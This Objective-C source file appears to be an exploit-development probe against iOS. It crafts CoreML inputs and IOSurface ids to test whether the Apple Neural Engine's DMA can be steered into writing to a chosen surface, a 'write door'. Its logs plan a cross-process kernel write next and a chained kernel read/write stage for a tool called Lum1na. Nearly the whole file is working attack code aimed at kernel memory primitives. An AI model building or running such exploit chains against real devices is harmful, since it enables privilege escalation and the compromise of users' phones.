//
//  P077AneYcraft.m — 43748 y-craft write-door probe. See P077AneYcraft.h.
//

#import "P077AneYcraft.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <math.h>
#import <string.h>
#import <unistd.h>

#define P077_BUILD @"p077-ycraft-v1"

#define P077_N_IN     127u
#define P077_MODEL    @"XVRC27_127in_1out"
#define P077_N_SURF   (P077_N_IN + 1u + 8u)   /* inputs + capture + margin */
#define P077_CAP_MARK 0x53535353u
#define P077_ONES     0x3F800000u             /* fp32 1.0 */

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*p077_iosCreate_t)(CFDictionaryRef);
typedef uint32_t (*p077_iosGetID_t)(IOSurfaceRef);
typedef void *(*p077_iosBase_t)(IOSurfaceRef);
typedef size_t (*p077_iosAllocSz_t)(IOSurfaceRef);
typedef kern_return_t (*p077_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);

typedef struct {
    IOSurfaceRef surf;
    uint32_t     sid;
    size_t       allocSize;
} p077_surf_t;

static int g_p077_fd = -1;
static NSMutableString *g_p077_buf;

static void p077_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P077AneYcraft class]) {
        if (g_p077_buf) [g_p077_buf appendString:out];
        if (g_p077_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_p077_fd, s, strlen(s));
                fcntl(g_p077_fd, F_FULLFSYNC);   /* panic-surviving flush per line */
            }
        }
    }
}

#pragma mark - IOSurface helpers (same shape as P075)

static p077_iosCreate_t  s_iosCreate;
static p077_iosGetID_t   s_iosGetID;
static p077_iosBase_t    s_iosBase;
static p077_iosAllocSz_t s_iosAllocSz;
static p077_iosLock_t    s_iosLock;
static p077_iosLock_t    s_iosUnlock;

static BOOL p077_resolve_iosurface(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return NO;
    s_iosCreate  = (p077_iosCreate_t)dlsym(h, "IOSurfaceCreate");
    s_iosGetID   = (p077_iosGetID_t)dlsym(h, "IOSurfaceGetID");
    s_iosBase    = (p077_iosBase_t)dlsym(h, "IOSurfaceGetBaseAddress");
    s_iosAllocSz = (p077_iosAllocSz_t)dlsym(h, "IOSurfaceGetAllocSize");
    s_iosLock    = (p077_iosLock_t)dlsym(h, "IOSurfaceLock");
    s_iosUnlock  = (p077_iosLock_t)dlsym(h, "IOSurfaceUnlock");
    return s_iosCreate && s_iosGetID && s_iosBase && s_iosAllocSz && s_iosLock && s_iosUnlock;
}

static CFNumberRef p077_cfnum(uint64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

static IOSurfaceRef p077_surface_create(void) {
    CFNumberRef w = p077_cfnum(1), h = p077_cfnum(1);
    CFNumberRef bpe = p077_cfnum(4), fmt = p077_cfnum(0x42475241); /* BGRA */
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vals[] = { w, h, bpe, fmt };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
                                               &kCFTypeDictionaryKeyCallBacks,
                                               &kCFTypeDictionaryValueCallBacks);
    CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(fmt);
    if (!props) return NULL;
    IOSurfaceRef s = s_iosCreate(props);
    CFRelease(props);
    return s;
}

static size_t p077_surface_fill_u32(IOSurfaceRef s, uint32_t pattern) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz == 0 || sz > (16UL << 20)) return 0;
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) return 0;
    uint32_t *p = (uint32_t *)base;
    for (size_t k = 0; k + 4 <= sz; k += 4) p[k / 4] = pattern;
    s_iosUnlock(s, 0, NULL);
    return sz;
}

static BOOL p077_surface_scan_pattern(p077_surf_t *e, const char *label, uint32_t pattern) {
    if (!e->surf) return NO;
    void *base = s_iosBase(e->surf);
    if (!base) return NO;
    size_t sz = e->allocSize;
    if (sz == 0 || sz > (16UL << 20)) return NO;
    if (s_iosLock(e->surf, 0, NULL) != KERN_SUCCESS) return NO;
    const uint8_t *b = (const uint8_t *)base;
    const uint8_t exp[4] = { (uint8_t)(pattern & 0xff), (uint8_t)((pattern >> 8) & 0xff),
                             (uint8_t)((pattern >> 16) & 0xff), (uint8_t)((pattern >> 24) & 0xff) };
    uint8_t first[16];
    memcpy(first, b, sizeof(first));
    size_t diffOff = sz;
    uint32_t diffCnt = 0;
    for (size_t k = 0; k < sz; k++) {
        if (b[k] != exp[k & 3]) { if (diffOff == sz) diffOff = k; diffCnt++; if (diffCnt >= 256) break; }
    }
    s_iosUnlock(e->surf, 0, NULL);
    if (diffOff != sz) {
        p077_log(@"  [!] %s TOUCHED sid=%u first diff at +0x%zx (>= %u bytes)",
                 label, e->sid, diffOff, diffCnt);
        p077_log(@"      first16 %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
                 first[0], first[1], first[2], first[3], first[4], first[5],
                 first[6], first[7], first[8], first[9], first[10], first[11],
                 first[12], first[13], first[14], first[15]);
        return YES;
    }
    return NO;
}

#pragma mark - fp16 decode (host-side; matches ARM fp16 semantics for our bit patterns)

/* decode a 16-bit IEEE-754 half pattern to double (no denormal flush) */
static double p077_fp16_decode(uint16_t bits) {
    uint32_t s   = (bits >> 15) & 1u;
    uint32_t e   = (bits >> 10) & 0x1Fu;
    uint32_t m   = bits & 0x3FFu;
    double val;
    if (e == 0)      val = (double)m * 5.9604644775390625e-8;   /* m * 2^-24 */
    else if (e < 31) val = (1.0 + (double)m / 1024.0) * ldexp(1.0, (int)e - 15);
    else             val = (m == 0) ? INFINITY : NAN;
    return s ? -val : val;
}

#pragma mark - CoreML

static NSURL *p077_model_url(NSString *name) {
    NSBundle *b = [NSBundle mainBundle];
    NSURL *u = [b URLForResource:name withExtension:@"mlmodelc"];
    if (u) return u;
    return [b URLForResource:name withExtension:@"mlpackage"];
}

static MLModel *p077_load(NSURL *url, NSError **errOut) {
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = MLComputeUnitsAll;
    return [MLModel modelWithContentsOfURL:url configuration:cfg error:errOut];
}

/* generic provider from a double x-array (len 127) */
static MLDictionaryFeatureProvider *p077_provider(const double *x, NSError **errOut) {
    NSMutableDictionary *features = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < P077_N_IN; i++) {
        MLMultiArray *m = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                     dataType:MLMultiArrayDataTypeDouble
                                                        error:nil];
        if (!m) return nil;
        m[0] = @( x[i] );
        features[[NSString stringWithFormat:@"x_%03u", i]] =
            [MLFeatureValue featureValueWithMultiArray:m];
    }
    return [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:errOut];
}

static double p077_predict(MLModel *model, MLDictionaryFeatureProvider *fp,
                           NSTimeInterval *dur, NSError **errOut) {
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    id<MLFeatureProvider> pred = [model predictionFromFeatures:fp error:errOut];
    CFAbsoluteTime t1 = CFAbsoluteTimeGetCurrent();
    *dur = t1 - t0;
    if (!pred) return NAN;
    MLFeatureValue *yv = [pred featureValueForName:@"y"];
    MLMultiArray *ya = yv.multiArrayValue;
    return ya ? ya[0].doubleValue : NAN;
}

static NSString *p077_yfmt(double y) {
    return (y == y) ? [NSString stringWithFormat:@"%.6e", y] : @"NaN";
}

@implementation P077AneYcraft

+ (NSString *)tap {
    g_p077_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p077_ane_ycraft_log.txt"];
    g_p077_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p077_log(@"=== p077 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P077_BUILD);
    p077_log(@"43748 y-craft: the output record sid is read from OUTPUT STAGING");
    p077_log(@"content, and each predict writes its y into that staging. So the");
    p077_log(@"previous predict's y IS the next predict's output record sid.");
    p077_log(@"Craft-B: y = fp16 pattern sid_C (raw-bits world). Craft-A: y =");
    p077_log(@"sid_C as an exact fp16 integer (value-decode world). Capture scan");
    p077_log(@"= write-door oracle; y==127.0/1.0 = read-door oracles.");
    p077_log(@"Risk note: skipped input records may leave ANE input IOVAs unmapped");
    p077_log(@"(possible dart fault — lab device, accepted).");
    p077_log(@"%@", [P007Board shared].kreadSignal);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p077"];
    if (stop) {
        p077_log(@"%@", stop);
        if (g_p077_fd >= 0) { fcntl(g_p077_fd, F_FULLFSYNC); close(g_p077_fd); g_p077_fd = -1; }
        NSString *ret = g_p077_buf; g_p077_buf = nil; return ret;
    }
    p077_log(@"%@", [LabDeviceProfile identBlock]);

    if (!p077_resolve_iosurface()) {
        p077_log(@"[-] IOSurface dlsym FAILED — abort");
        p077_log(@"=== VERDICT ===");
        p077_log(@"abort (iosurface). hasKread=NO hasKwrite=NO.");
        if (g_p077_fd >= 0) { fcntl(g_p077_fd, F_FULLFSYNC); close(g_p077_fd); g_p077_fd = -1; }
        NSString *ret = g_p077_buf; g_p077_buf = nil; return ret;
    }

    /* ---- surfaces ---- */
    p077_surf_t *surfs = calloc(P077_N_SURF, sizeof(p077_surf_t));
    uint32_t made = 0;
    for (uint32_t i = 0; i < P077_N_SURF; i++) {
        IOSurfaceRef s = p077_surface_create();
        if (!s) { p077_log(@"  surf[%u] create FAILED", i); continue; }
        surfs[made].surf = s;
        surfs[made].sid = s_iosGetID(s);
        surfs[made].allocSize = s_iosAllocSz(s);
        made++;
    }
    p077_log(@"[+] surfaces: %u/%u (127 inputs + 1 capture + margin)", made, P077_N_SURF);
    if (made < P077_N_IN + 1) {
        p077_log(@"[-] not enough surfaces — abort");
        p077_log(@"=== VERDICT ===");
        p077_log(@"abort (surfaces). hasKread=NO hasKwrite=NO.");
        if (g_p077_fd >= 0) { fcntl(g_p077_fd, F_FULLFSYNC); close(g_p077_fd); g_p077_fd = -1; }
        NSString *ret = g_p077_buf; g_p077_buf = nil; return ret;
    }
    uint32_t nIn = P077_N_IN;
    p077_surf_t *cap = &surfs[nIn];      /* capture = index 127 */
    p077_surf_t *in = surfs;             /* inputs = 0..126 */

    for (uint32_t i = 0; i < nIn; i++) p077_surface_fill_u32(in[i].surf, P077_ONES);
    p077_surface_fill_u32(cap->surf, P077_CAP_MARK);

    uint32_t sidC = cap->sid;
    double vB = p077_fp16_decode((uint16_t)(sidC & 0xFFFFu));   /* craft-B y target */
    double delta = (double)sidC - (double)in[0].sid;            /* craft-A x_1 */
    p077_log(@"[+] capture sid_C=%u marker 0x53; in[0].sid=%u; input sids %u..%u",
             sidC, in[0].sid, in[0].sid, in[nIn - 1].sid);
    p077_log(@"[+] craft-B y target vB = fp16_decode(0x%04x) = %.9e", (uint16_t)(sidC & 0xFFFFu), vB);
    p077_log(@"[+] craft-A x_1 delta = sid_C - in[0].sid = %.1f (fp16-exact: %d)",
             delta, (delta > 0 && delta <= 2048 && delta == floor(delta)));
    BOOL craftAOk = (delta > 0 && delta <= 2048 && delta == floor(delta));

    /* ---- x arrays ---- */
    double xWarm[P077_N_IN], xB[P077_N_IN], xA[P077_N_IN];
    for (uint32_t i = 0; i < nIn; i++) {
        xWarm[i] = (double)in[i].sid;      /* v1-style arm: fallback baseline */
        xB[i] = 0.0;                        /* craft-B: zeros + vB at x_126 */
        xA[i] = 0.0;                        /* craft-A: sid + delta + zeros  */
    }
    xB[nIn - 1] = vB;
    if (craftAOk) { xA[0] = (double)in[0].sid; xA[1] = delta; }

    /* ---- load ---- */
    NSURL *url = p077_model_url(P077_MODEL);
    NSError *err = nil;
    MLModel *model = p077_load(url, &err);
    if (!model) {
        p077_log(@"[-] load FAILED: %@", err.localizedDescription ?: @"-");
        p077_log(@"=== VERDICT ===");
        p077_log(@"abort (load). hasKread=NO hasKwrite=NO.");
        for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p077_fd >= 0) { fcntl(g_p077_fd, F_FULLFSYNC); close(g_p077_fd); g_p077_fd = -1; }
        NSString *ret = g_p077_buf; g_p077_buf = nil; return ret;
    }
    p077_log(@"[+] %@ loaded (computeUnits=All)", P077_MODEL);

    MLDictionaryFeatureProvider *fpWarm = p077_provider(xWarm, &err);
    MLDictionaryFeatureProvider *fpB    = p077_provider(xB, &err);
    MLDictionaryFeatureProvider *fpA    = craftAOk ? p077_provider(xA, &err) : nil;
    if (!fpWarm || !fpB) {
        p077_log(@"[-] provider FAILED: %@", err.localizedDescription ?: @"-");
        p077_log(@"=== VERDICT ===");
        p077_log(@"abort (provider). hasKread=NO hasKwrite=NO.");
        for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p077_fd >= 0) { fcntl(g_p077_fd, F_FULLFSYNC); close(g_p077_fd); g_p077_fd = -1; }
        NSString *ret = g_p077_buf; g_p077_buf = nil; return ret;
    }

    /* ---- W: warm + baseline (v1-style arm) ---- */
    NSTimeInterval d = 0;
    double yW = p077_predict(model, fpWarm, &d, &err);
    BOOL capW = p077_surface_scan_pattern(cap, "capture(W)", P077_CAP_MARK);
    p077_log(@"[*] W   y=%@ t=%.1fms cap=%d  (expect ~3.6e4 staging/fallback shape)",
             p077_yfmt(yW), d * 1000.0, capW);

    /* ---- Craft-B: zeros + vB ---- */
    p077_log(@">>> CRAFT-B: x_126 = vB (fp16 pattern 0x%04x = sid_C); y target %.9e",
             (uint16_t)(sidC & 0xFFFFu), vB);
    double yB1 = p077_predict(model, fpB, &d, &err);
    BOOL capB1 = p077_surface_scan_pattern(cap, "capture(B1)", P077_CAP_MARK);
    p077_log(@"[*] B1  y=%@ t=%.1fms cap=%d  (oracle: vB=%.9e staging/abort | 127.0 read)",
             p077_yfmt(yB1), d * 1000.0, capB1, vB);

    /* B2: output staging now holds fp16(y_B1). If y_B1 == vB exactly, the
       staged fp16 bit pattern == sid_C -> output record sid = sid_C. */
    double yB2 = p077_predict(model, fpB, &d, &err);
    BOOL capB2 = p077_surface_scan_pattern(cap, "capture(B2)", P077_CAP_MARK);
    p077_log(@"[*] B2  y=%@ t=%.1fms cap=%d  <- WRITE-DOOR SCAN (staged bits = sid_C)",
             p077_yfmt(yB2), d * 1000.0, capB2);

    double yB3 = p077_predict(model, fpB, &d, &err);
    BOOL capB3 = p077_surface_scan_pattern(cap, "capture(B3)", P077_CAP_MARK);
    p077_log(@"[*] B3  y=%@ t=%.1fms cap=%d  (stability + second write chance)",
             p077_yfmt(yB3), d * 1000.0, capB3);

    /* ---- Craft-A: in[0].sid + delta ---- */
    BOOL capA1 = NO, capA2 = NO, capA3 = NO;
    double yA1 = NAN, yA2 = NAN, yA3 = NAN;
    if (craftAOk && fpA) {
        p077_log(@">>> CRAFT-A: x_0 = in[0].sid=%u, x_1 = delta=%.1f; y target = sid_C=%u exactly",
                 in[0].sid, delta, sidC);
        yA1 = p077_predict(model, fpA, &d, &err);
        capA1 = p077_surface_scan_pattern(cap, "capture(A1)", P077_CAP_MARK);
        p077_log(@"[*] A1  y=%@ t=%.1fms cap=%d  (oracle: %u staging/abort | 127.0 all-surfaces |",
                 p077_yfmt(yA1), d * 1000.0, capA1, sidC);
        p077_log(@"             1.0 wired-only = skip-and-continue proof)");

        /* A2: output staging holds fp16(y_A1) = fp16(sid_C) -> value-decode sid = sid_C */
        yA2 = p077_predict(model, fpA, &d, &err);
        capA2 = p077_surface_scan_pattern(cap, "capture(A2)", P077_CAP_MARK);
        p077_log(@"[*] A2  y=%@ t=%.1fms cap=%d  <- WRITE-DOOR SCAN (staged value = sid_C)",
                 p077_yfmt(yA2), d * 1000.0, capA2);

        yA3 = p077_predict(model, fpA, &d, &err);
        capA3 = p077_surface_scan_pattern(cap, "capture(A3)", P077_CAP_MARK);
        p077_log(@"[*] A3  y=%@ t=%.1fms cap=%d  (stability)", p077_yfmt(yA3), d * 1000.0, capA3);
    } else {
        p077_log(@"[-] craft-A SKIPPED (delta %.1f not fp16-exact in (0,2048])", delta);
    }

    /* input read-only check */
    BOOL inTouched = p077_surface_scan_pattern(in, "in[0](end)", P077_ONES);
    p077_log(@"[*] in[0] touched=%d (expected NO — inputs read-only)", inTouched);

    /* ---- verdict ---- */
    p077_log(@"=== VERDICT ===");
    BOOL writeDoor = (capB2 || capB3 || capA2 || capA3);
    BOOL readAll   = ((yB1 == 127.0) || (yA1 == 127.0));
    BOOL readWired = (craftAOk && yA1 == 1.0);

    if (writeDoor) {
        p077_log(@"WRITE DOOR OPEN: capture surface (sid_C=%u) was WRITTEN through the", sidC);
        p077_log(@"crafted output record — the ANE DMA wrote the program output into a");
        p077_log(@"surface whose id was staged content we control. Own-target this tap.");
        p077_log(@"NEXT (Stage B): craft the sid of a FOREIGN IOSurface (enumerated via");
        p077_log(@"IOSurfaceLookup or the M2Scaler KVA candidate) = cross-process kernel");
        p077_log(@"write. Then port into Lum1na as the chained 43748 KRW stage.");
        [[P007Board shared] recordEvent:@"p077_session" kind:@"write_door"
                                 detail:[NSString stringWithFormat:@"sid_C=%u written", sidC]
                                 source:@"p077"];
    }
    if (readAll) {
        p077_log(@"READ DOOR (all surfaces): y == 127.0 — ANE read OUR 127 input surfaces.");
        p077_log(@"Stage B: arm ONE foreign sid among the inputs = y leaks foreign bytes.");
        [[P007Board shared] recordEvent:@"p077_session" kind:@"read_door"
                                 detail:@"y==127.0 all-surfaces read" source:@"p077"];
    }
    if (readWired) {
        p077_log(@"READ DOOR (wired-only) + skip-and-continue PROVEN: y == 1.0 with only");
        p077_log(@"in[0] wired — bad records are skipped, not fatal. This unlocks the");
        p077_log(@"mixed valid/foreign input arm for Stage B.");
    }
    if (!writeDoor && !readAll && !readWired) {
        p077_log(@"No door this tap. y shapes: W=%@ B1=%@ B2=%@ A1=%@ A2=%@",
                 p077_yfmt(yW), p077_yfmt(yB1), p077_yfmt(yB2),
                 p077_yfmt(yA1), p077_yfmt(yA2));
        p077_log(@"Interpretation tree:");
        p077_log(@"  - yB1==vB and capture untouched -> output sid is NOT staging");
        p077_log(@"    content, OR the request aborts on the first bad record");
        p077_log(@"    (craft-B inputs are all sid 0 by construction).");
        p077_log(@"  - yA1==sid_C and capture untouched -> same abort question for");
        p077_log(@"    craft-A (x_1 delta is a valid small int but not a live sid).");
        p077_log(@"  NEXT: Ghidra the MemoryMapRequest record-loop failure path");
        p077_log(@"  (skip-and-continue vs abort) and who fills proc entry field[0].");
        [[P007Board shared] recordEvent:@"p077_session" kind:@"miss"
                                 detail:@"no door" source:@"p077"];
    }
    p077_log(@"Honesty: own surfaces only this tap; foreign transfer not measured.");
    p077_log(@"Conversion bar (desc_type_forged OR (body_forged AND kptr)) untouched.");
    p077_log(@"hasKread=NO hasKwrite=NO. One TAP per force-quit; fresh boot next tap.");

    for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
    free(surfs);

    if (g_p077_fd >= 0) { fcntl(g_p077_fd, F_FULLFSYNC); close(g_p077_fd); g_p077_fd = -1; }
    NSString *ret = g_p077_buf;
    g_p077_buf = nil;
    return ret;
}

@end